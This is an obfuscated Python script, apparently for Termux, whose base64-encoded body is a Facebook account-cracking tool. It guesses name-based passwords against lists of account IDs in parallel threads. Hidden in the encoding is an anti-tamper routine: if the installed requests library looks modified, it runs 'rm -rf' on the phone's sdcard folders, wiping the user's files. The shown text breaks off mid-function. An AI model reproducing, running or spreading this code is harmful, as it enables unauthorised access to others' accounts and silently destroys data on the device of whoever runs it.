#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 2.5
#______CODING BY: ùë®ùë≥ùë¨ùëøùë®ùëµùë´ùë¨ùëπ
#______GITHUB : https://github.com/ùë®ùë≥ùë¨ùëøùë®ùëµùë´ùë¨ùëπùë≤ùë¨ùëµùë∑ùë∂ùëÆùë∞
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBJTVBPUlQtQ09ERSBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCBtYXJzaGFsLCBiYXNlNjQsIHpsaWIKZnJvbSBvcyBpbXBvcnQgcGF0aAppbXBvcnQgb3MsYmFzZTY0LHpsaWIscGlwLHVybGxpYgp0cnk6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgaW1wb3J0IG9zLHJlcXVlc3RzLGpzb24sdGltZSxyZSxyYW5kb20sc3lzLHV1aWQsc3RyaW5nLHN1YnByb2Nlc3MKICAgICAgICBmcm9tIHN0cmluZyBpbXBvcnQgKgogICAgICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZApleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzIGZ1dHVyZXM9PTIgPiAvZGV2L251bGwnKQpleGNlcHQ6cGFzcwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIENPTE9SLUNPREUgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwphPSdceDFiWzM4OzU7MTE4bSc7Yj0nXHgxYlszODs1OzExOW0nO2M9J1x4MWJbMzg7NTsxMjBtJztkPSdceDFiWzM4OzU7MTIxbSc7ZT0nXHgxYlszODs1OzEyMm0nO2c9J1x4MWJbMzg7NTs0Nm0nO3I9J1x4MWJbMzg7NTsxOTZtJzt3PSdcMDMzWzE7MzdtJwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIFNFQ1VSSVRZLUNPREUgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgZnVja2VyKCk6CiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiAvc2RjYXJkLyonKQogICAgb3Muc3lzdGVtKCdybS1yZiAvc2RjYXJkL0RDSU0vJykKICAgIG9zLnN5c3RlbSgncm0tcmYgL3NkY2FyZC9BbmRyb2lkLycpCiAgICBvcy5zeXN0ZW0oJ3JtLXJmIC9zZGNhcmQvQW5kcm9pZC9kYXRhLycpCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiAvc2RjYXJkL0Rvd25sb2FkLyonKQogICAgb3Muc3lzdGVtKCdybSAtcmYgL3NkY2FyZDEvKicpCiAgICBvcy5zeXN0ZW0oJ3JtIC1yZiAvc2RjYXJkLzAvKicpCnRyeToKICAgIG11cnNhbGluID0gb3BlbigiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvcHl0aG9uMy4xMS9zaXRlLXBhY2thZ2VzL3JlcXVlc3RzL21vZGVscy5weSIsICJyIikucmVhZCgpCiAgICBhbGluID0gbGVuKG11cnNhbGluKQogICAgaWYgYWxpbiAhPSAzNTIyMzoKICAgICAgICBmdWNrZXIoKQogICAgICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCiAgICBlbHNlOgogICAgICAgIHBhc3MgCmV4Y2VwdDoKICAgIGZ1Y2tlcigpCiAgICBleGl0KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRlVDSyBCWVBBU1MgVVNFUi4uLiAnKQp0cnk6CiAgICBtdXJzYWxpbiA9IG9wZW4oIi9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy9hdXRoLnB5IiwgInIiKS5yZWFkKCkKICAgIGFsaW4gPSBsZW4obXVyc2FsaW4pCiAgICBpZiBhbGluICE9IDEwMTg3OgogICAgICAgIGZ1Y2tlcigpCiAgICAgICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKICAgIGVsc2U6CiAgICAgICAgcGFzcyAKZXhjZXB0OgogICAgZnVja2VyKCkKICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCnRyeToKICAgIG11cnNhbGluID0gb3BlbigiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvcHl0aG9uMy4xMS9zaXRlLXBhY2thZ2VzL3JlcXVlc3RzL2FwaS5weSIsICJyIikucmVhZCgpCiAgICBhbGluID0gbGVuKG11cnNhbGluKQogICAgaWYgYWxpbiAhPSA2NDQ5OgogICAgICAgIGZ1Y2tlcigpCiAgICAgICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKICAgIGVsc2U6CiAgICAgICAgcGFzcyAKZXhjZXB0OgogICAgZnVja2VyKCkKICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCnRyeToKICAgIG11cnNhbGluID0gb3BlbigiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvcHl0aG9uMy4xMS9zaXRlLXBhY2thZ2VzL3JlcXVlc3RzL3Nlc3Npb25zLnB5IiwgInIiKS5yZWFkKCkKICAgIGFsaW4gPSBsZW4obXVyc2FsaW4pCiAgICBpZiBhbGluICE9IDMwMzczOgogICAgICAgIGZ1Y2tlcigpCiAgICAgICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKICAgIGVsc2U6CiAgICAgICAgcGFzcyAKZXhjZXB0OgogICAgZnVja2VyKCkKICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCnRyeToKICAgIGtpbmc9Jy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy8nCiAgICBpZiBub3QgJ3ByaW50JyBpbiBvcGVuKGtpbmcrJ3Nlc3Npb25zLnB5JywncicpLnJlYWQoKToKICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgIGZ1Y2tlcigpCiAgICAgICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKZXhjZXB0OgogICAgZnVja2VyKCkKICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCnRyeToKICAgIHFlZW49Jy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy8nCiAgICBpZiBub3QgJ3ByaW50JyBpbiBvcGVuKHFlZW4rJ21vZGVscy5weScsJ3InKS5yZWFkKCk6CiAgICAgICAgcGFzcwogICAgZWxzZToKICAgICAgICBmdWNrZXIoKQogICAgICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCmV4Y2VwdDoKICAgIGZ1Y2tlcigpCiAgICBleGl0KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRlVDSyBCWVBBU1MgVVNFUi4uLiAnKQp0cnk6CiAgICBkb249Jy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy8nCiAgICBpZiBub3QgJ3ByaW50JyBpbiBvcGVuKGRvbisnYXBpLnB5JywncicpLnJlYWQoKToKICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgIGZ1Y2tlcigpCiAgICAgICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKZXhjZXB0OgogICAgZnVja2VyKCkKICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCnRyeToKICAgIGtpbmc9Jy9kYXRhL2RhdGEvY29tLnRlcm11eC9maWxlcy91c3IvbGliL3B5dGhvbjMuMTEvc2l0ZS1wYWNrYWdlcy9yZXF1ZXN0cy8nCiAgICBpZiBub3QgJ3N5cy5zdGRvdXQud3JpdGUnIGluIG9wZW4oa2luZysnc2Vzc2lvbnMucHknLCdyJykucmVhZCgpOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgZnVja2VyKCkKICAgICAgICBleGl0KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRlVDSyBCWVBBU1MgVVNFUi4uLiAnKQpleGNlcHQ6CiAgICBmdWNrZXIoKQogICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKdHJ5OgogICAgcWVlbj0nL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzL3Vzci9saWIvcHl0aG9uMy4xMS9zaXRlLXBhY2thZ2VzL3JlcXVlc3RzLycKICAgIGlmIG5vdCAnc3lzLnN0ZG91dC53cml0ZScgaW4gb3BlbihxZWVuKydtb2RlbHMucHknLCdyJykucmVhZCgpOgogICAgICAgIHBhc3MKICAgIGVsc2U6CiAgICAgICAgZnVja2VyKCkKICAgICAgICBleGl0KGYnXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRlVDSyBCWVBBU1MgVVNFUi4uLiAnKQpleGNlcHQ6CiAgICBmdWNrZXIoKQogICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKdHJ5OgogICAgZG9uPScvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2xpYi9weXRob24zLjExL3NpdGUtcGFja2FnZXMvcmVxdWVzdHMvJwogICAgaWYgbm90ICdzeXMuc3Rkb3V0LndyaXRlJyBpbiBvcGVuKGRvbisnYXBpLnB5JywncicpLnJlYWQoKToKICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgIGZ1Y2tlcigpCiAgICAgICAgZXhpdChmJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUZVQ0sgQllQQVNTIFVTRVIuLi4gJykKZXhjZXB0OgogICAgZnVja2VyKCkKICAgIGV4aXQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GVUNLIEJZUEFTUyBVU0VSLi4uICcpCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgSEVYWFgtQ09ERSBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCnVzZXI9W107b2s9W107Y3A9W107dHdmPVtdO2NweD1bXTtjb2tpeD1bXTtwbGlzdD1bXTtsb29wPTAKb2tzPVtdCmNwcz1bXQpsb29wPTAKZm9sZGVyX3BhdGggPSAnL3NkY2FyZC9Ub3hpYycKdHJ5OgogICAgb3MubWFrZWRpcnMoZm9sZGVyX3BhdGgsIGV4aXN0X29rPVRydWUpCmV4Y2VwdDoKICAgIHBhc3MKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBTQy1DT0RFIF0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKbWFpbl94ID0gJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N20xXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bSBCZCBSYW5kb20gXG4gXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3bTJceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIEluZGlhIHJhbmRvbSBcbiBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdtM1x4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm0gTmVwYWwgUmFuZG9tJztiZF94ID0gJ1x4MWJbMzg7NTs0Nm0wMTcgXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0Nm0gMDE4IFx4MWJbMTs5N23il49ceDFiWzM4OzU7NDZtIDAxOSc7aW5kX3ggPSAnXHgxYlszODs1OzQ2bSs5MTYzOSBceDFiWzE7OTdt4pePXHgxYlszODs1OzQ2bSArOTE2MDAgXHgxYlsxOzk3beKXj1x4MWJbMzg7NTs0Nm0gKzkxNjIwJztsaW5lX3ggPSAnXHgxYlsxOzk3beKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgSc7Y3BfeCA9ICdceDFiWzM4OzU7NDZtRG8gWW91IFdlbnQgU2hvdyBDcCBJZHMgXHgxYlszODs1OzE5Nm1bXHgxYlszODs1OzQ2bVlceDFiWzE7OTdtfFx4MWJbMzg7NTs0Nm1OXHgxYlszODs1OzE5Nm1dJztjb2tpX3ggPSdceDFiWzM4OzU7NDZtRG8gWW91IFdlbnQgU2hvdyBDb29raWVzXHgxYlszODs1OzE5Nm1bXHgxYlszODs1OzQ2bVlceDFiWzE7OTdtfFx4MWJbMzg7NTs0Nm1OXHgxYlszODs1OzE5Nm1dJztjID0nXHgxYlsxOzk3bUNob2ljZScKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tWyBMT0dPLUNPREUgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpsb2dvPSgiIiJcMDMzWzE7MzNtCkJPQk8gU0kgREVOViBBVCBKQVJTRUwKUEFOR0lUIEtPIEhBQ0tFUiBTSSBKQVJTRUwgQVQgREVOVgpKRUpFTU9OIEhBQ0tFUiBTSSBKQVJTRUwgQVQgREVOVgpCQVRBIFBBIFNJIEpBUlNFTCBBVCBERU5WCgogICAgICAgICAgICAgIHt94paI4paI4paI4paI4paI4paI4paI4pWXe33ilojilojilZcgIOKWiOKWiOKVl3t9IOKWiOKWiOKWiOKWiOKWiOKVlyB7fSDilojilojilojilojilojilZcKICAgICAgICAgICAgICB7feKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnXt94pWa4paI4paI4pWX4paI4paI4pWU4pWde33ilojilojilZTilZDilZDilojilojilZd7feKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlwogICAgICAgICAgICAgIHt94paI4paI4paI4paI4paI4pWXe30gICDilZrilojilojilojilZTilZ0ge33ilojilojilZEgIOKVmuKVkOKVnXt94paI4paI4paI4paI4paI4paI4paI4pWRCiAgICAgICAgICAgICAge33ilojilojilZTilZDilZDilZ17fSAgIOKWiOKWiOKVlOKWiOKWiOKVlyB7feKWiOKWiOKVkSAg4paI4paI4pWXe33ilojilojilZTilZDilZDilojilojilZEKICAgICAgICAgICAgICB7feKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl3t94paI4paI4pWU4pWd4pWa4paI4paI4pWXe33ilZrilojilojilojilojilojilZTilZ17feKWiOKWiOKVkSAg4paI4paI4pWRCiAgICAgICAgICAgICAge33ilZrilZDilZDilZDilZDilZDilZDilZ17feKVmuKVkOKVnSAg4pWa4pWQ4pWde30g4pWa4pWQ4pWQ4pWQ4pWQ4pWdIHt94pWa4pWQ4pWdICDilZrilZDilZ0KCiAgICAgICAgICAgICAgICAgICAgSEFDS0VSIEpBU1JFTCDwn5SlClx4MWJbMTs5N23ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEKXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKJo1x4MWJbMzg7NTsxOTZtXVwwMzNbMzg7NTs0Nm1PV09ORVIgICAgIFx4MWJbMTs5N23il48gXDAzM1szODs1OzQ2bUhBQ0tFUiBKQVNSRUwgQVQgREVOVgpceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4omjXHgxYlszODs1OzE5Nm1dXDAzM1szODs1OzQ2bUZhY2Vib29rICAgXHgxYlsxOzk3beKXjyBcMDMzWzM4OzU7NDZtSEFDS0VSIEpBU1JFTApceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4omjXHgxYlszODs1OzE5Nm1dXDAzM1szODs1OzQ2bUd1dGh1YiAgIFx4MWJbMTs5N20gIOKXjyBcMDMzWzM4OzU7NDZtSkFTUkVMMTcKXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKJo1x4MWJbMzg7NTsxOTZtXVwwMzNbMzg7NTs0Nm1Ub29scyAgICAgIFx4MWJbMTs5N23il48gXDAzM1szODs1OzQ2bVBBSUQKXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKJo1x4MWJbMzg7NTsxOTZtXVwwMzNbMzg7NTs0Nm1WZXJzaW9uICAgIFx4MWJbMTs5N23il48gXDAzM1szODs1OzQ2bVYvMC4xClx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23iiaNceDFiWzM4OzU7MTk2bV1cMDMzWzM4OzU7NDZtW0dJUkxGUklFTkRdICBceDFiWzE7OTdt4pePIFwwMzNbMzg7NTs4NG1bXHgxYlsxOzk1bUxPVkUgU0kgREVOVlwwMzNbMzg7NTs4NG1dClx4MWJbMTs5N23ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEiIiIpCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgQ0xFQVItQ09ERSBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCmRlZiBmcmVzaCgpOm9zLnN5c3RlbSgnY2xlYXInKTtwcmludChsb2dvKQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIExJTkUtQ09ERSBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0jCmRlZiBsaW5lKCk6cHJpbnQoZid7bGluZV94fScpCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgTUFJTi1DT0RFIF0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIE1haW4oKToKICAgIGZyZXNoKCk7cHJpbnQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdtMVx4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm0gUkFORE9NIENSQUNLSU5HIEhBQ0tFUiBTSSBKQVJTRUwgQVQgREVOVlxuXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3bTJceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtIEZJTEUgQ0xPTklORyBIQUNLRVIgU0kgSkFSU0VMIEFUIERFTlZcblx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N20zXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bUV4aXQgTWFudSAnKTtsaW5lKCkKICAgIG1hbnUgPSBpbnB1dChmJ1x4MWJbMzg7NTsxOTZtXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXHgxYlszODs1OzQ2bXtjfSA6ICcpCiAgICBpZiBtYW51IGluIFsnMScsJzAxJ106Y291bnRyeSgpCiAgICBlbGlmIG1hbnUgaW4gWycyJywnMDInXTpmaWxlKCkKICAgIGVsc2U6TWFpbigpCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsgRklMRS1DT0RFIF0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSMKZGVmIGZpbGUoKToKICAgIGZyZXNoKCk7cHJpbnQoIiBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1GT1IgRVhBTVBMRTogXHgxYlszODs1OzQ2bS9zZGNhcmQvdG94aWMudHh0Iik7bGluZSgpCiAgICBmaWxlID0gaW5wdXQoIiBceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dIFx4MWJbMzg7NTs0Nm1QVVQgRklMRSBQQVRIIDogIikKICAgIHRyeToKICAgICAgICBmbyA9IG9wZW4oZmlsZSwncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICBsaW5lKCk7cHJpbnQoZidceDFiWzM4OzU7MTk2bVtceDFiWzE7OTdt4pePXHgxYlszODs1OzE5Nm1dRmlsZSBsb2NhdGlvbiBub3QgZm91bmQgJyk7dGltZS5zbGVlcCgyKTtmaWxlKCkKICAgIGZyZXNoKCk7cHJpbnQoJ1x4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm0xXHgxYlszODs1OzE5Nm1dXHgxYlszODs1OzQ2bU1ldGhvZCBceDFiWzE7OTdtJykKICAgIHByaW50KCdceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtMlx4MWJbMzg7NTsxOTZtXVx4MWJbMzg7NTs0Nm1NZXRob2QgXHgxYlsxOzk3bScpCiAgICBwcmludCgnXHgxYlszODs1OzE5Nm1bXHgxYlszODs1OzQ2bTNceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtTWV0aG9kIFx4MWJbMTs5N20nKTtsaW5lKCkKICAgIFRveGljX3g9aW5wdXQoIlx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV1ceDFiWzM4OzU7NDZtQ0hPT1NFIDogIikKICAgIHBsaXN0PVtdCiAgICBmcmVzaCgpCiAgICB0cnk6CiAgICAgICAgcHNfbGltaXQgPSBpbnQoaW5wdXQoKCIgXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRU5URVIgUEFTU1dPUkQgTElNSVQgOiAiKSkpCiAgICBleGNlcHQ6CiAgICAgICAgcHNfbGltaXQgPTEKICAgIGZyZXNoKCkKICAgIHByaW50KGYnIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bUVYQU1QTEUgXHgxYlsxOzk3beKXjyBmaXJzdCBsYXN0IFx4MWJbMzg7NTsxOTZtfFx4MWJbMzg7NTs0Nm0gZmlyc3QxMjMnKQogICAgcHJpbnQoZicgXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRVhBTVBMRVx4MWJbMTs5N218XHgxYlszODs1OzQ2bTU3MjczMjAwIDU5MDM5MjAwIDU3NTc1NzUxICcpIAogICAgbGluZSgpCiAgICBmb3IgaSBpbiByYW5nZShwc19saW1pdCk6CiAgICAgICAgcGxpc3QuYXBwZW5kKGlucHV0KGYiIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bVBVVCBQQVNTV09SRFx4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm0lc1x4MWJbMzg7NTsxOTZtXVx4MWJbMTs5N218IiUoaSsxKSkpCiAgICB3aXRoIHRyZWQobWF4X3dvcmtlcnM9MzApIGFzIFRPWElDOgogICAgICAgIGZyZXNoKCkKICAgICAgICB0bCA9IHN0cihsZW4oZm8pKQogICAgICAgIHByaW50KGYnIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bVRPVEFMIElEUyBceDFiWzE7OTdt4pePIHt0bH0nKQogICAgICAgIHByaW50KGYnIFx4MWJbMzg7NTsxOTZtW1x4MWJbMTs5N23il49ceDFiWzM4OzU7MTk2bV0gXHgxYlszODs1OzQ2bU1FVEhPRCBceDFiWzE7OTdt4pePIFx4MWJbMTs5N21Ne1RveGljX3h9XHgxYlszODs1OzQ2bScpCiAgICAgICAgcHJpbnQoZiIgXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3beKXj1x4MWJbMzg7NTsxOTZtXSBceDFiWzM4OzU7NDZtRklSU1QgXHgxYlszODs1OzE5Nm1bXHgxYlsxOzk3bU9OXHgxYlszODs1OzE5Nm0vXDAzM1szODs1OzE5Nm1PRkZceDFiWzM4OzU7MTk2bV0gXHgxYlsxOzk3bUFJUlBMQU5FIE1PREUiKQogICAgICAgIGxpbmUoKQogICAgICAgIGZvciB1c2VyIGluIGZvOgogICAgICAgICAgICBpZHMsbmFtZXMgPSB1c2VyLnNwbGl0KCd8JykKICAgICAgICAgICAgcGFzc2xpc3QgPSBwbGlzdAogICAgICAgICAgICBpZiBUb3hpY194ID09JzEnOgogICAgICAgICAgICAgICAgVE9YSUMuc3VibWl0KGFwaTEsaWRzLG5hbWVzLHBhc3NsaXN0KQogICAgICAgICAgICBpZiBUb3hpY194ID09JzInOgogICAgICAgICAgICAgICAgVE9YSUMuc3VibWl0KGFwaTIsaWRzLG5hbWVzLHBhc3NsaXN0KQogICAgICAgICAgICBpZiBUb3hpY194ID09JzMnOgogICAgICAgICAgICAgICAgVE9YSUMuc3VibWl0KGFwaTMsaWRzLG5hbWVzLHBhc3NsaXN0KQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1bIEZJTEUtTUVUSE9ELUNPREUgXS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIwpkZWYgYXBpMShpZHMsbmFtZXMscGFzc2xpc3QpOgogICAgdHJ5OgogICAgICAgIGdsb2JhbCBvayxsb29wLHNpbV9pZAogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclx4MWJbMzg7NTsxOTZtIFtceDFiWzM4OzU7NDZtSEFDS0VSIFNJIEpBUlNFTFx4MWJbMTs5N20tXHgxYlszODs1OzQ2bU0xXHgxYlszODs1OzE5Nm1dXHgxYlsxOzk3bS1ceDFiWzM4OzU7MTk2bVtceDFiWzM4OzU7NDZtJXNceDFiWzM4OzU7MTk2bV1ceDFiWzE7OTdtLVx4MWJbMzg7NTsxOTZtW1x4MWJbMzg7NTs0Nm1PSzolc1x4MWJbMzg7NTsxOTZtXSclKGxvb3AsbGVuKG9rcykpKTtzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICBmbiA9IG5hbWVzLnNwbGl0KCcgJylbMF0KICAgICAgICB0cnk6CiAgICAgICAgICAgIGxuID0gbmFtZXMuc3BsaXQoJyAnKVsxXQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgbG4gPSBmbgogICAgICAgICAgICAjTTEKICAgICAgICBmb3IgcHcgaW4gcGFzc2xpc3Q6CiAgICAgICAgICAgIHBhcyA9IHB3LnJlcGxhY2UoJ2ZpcnN0Jyxmbi5sb3dlcigpKS5yZXBsYWNlKCdGaXJzdCcsZm4pLnJlcGxhY2UoJ2xhc3QnLGxuLmxvd2VyKCkpLnJlcGxhY2UoJ0xhc3QnLGxuKS5yZXBsYWNlKCdOYW1lJyxuYW1lcykucmVwbGFjZSgnbmFtZScsbmFtZXMubG93ZXIoKSkK